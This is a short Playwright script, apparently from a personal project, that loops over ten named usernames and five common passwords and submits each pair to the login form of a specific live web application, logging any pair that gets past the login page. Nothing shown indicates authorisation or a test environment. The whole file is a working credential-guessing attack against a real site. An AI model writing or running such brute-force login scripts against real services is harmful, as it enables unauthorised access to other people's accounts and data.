import { chromium } from "/home/spil/projects/personal/portofolio-nextjs/node_modules/playwright/index.mjs";

async function testOtherLogins() {
  const browser = await chromium.launch({
    headless: true,
    args: ["--no-sandbox", "--disable-setuid-sandbox"]
  });

  const context = await browser.newContext({
    viewport: { width: 1440, height: 900 },
    deviceScaleFactor: 2
  });

  const page = await context.newPage();

  const users = ["wm", "atiq", "atiqct", "kasir", "rouser", "andryhuang", "didi", "lia", "winny", "hera"];
  const passwords = ["password123", "password", "12345678", "nusaevo", "123456"];

  for (const u of users) {
    for (const p of passwords) {
      try {
        await page.goto("https://app.nusaevo.com/login", { waitUntil: "networkidle", timeout: 15000 });
        await page.fill('input[name="code"]', u);
        await page.fill('input[name="password"]', p);
        await Promise.all([
          page.waitForNavigation({ timeout: 8000 }).catch(() => {}),
          page.click('button[type="submit"]')
        ]);
        await page.waitForTimeout(1000);
        if (!page.url().includes("/login")) {
          console.log(`>>> SUCCESS: user=${u}, pass=${p}, url=${page.url()}`);
          break;
        }
      } catch (e) {
        // continue
      }
    }
  }

  await browser.close();
}

testOtherLogins();
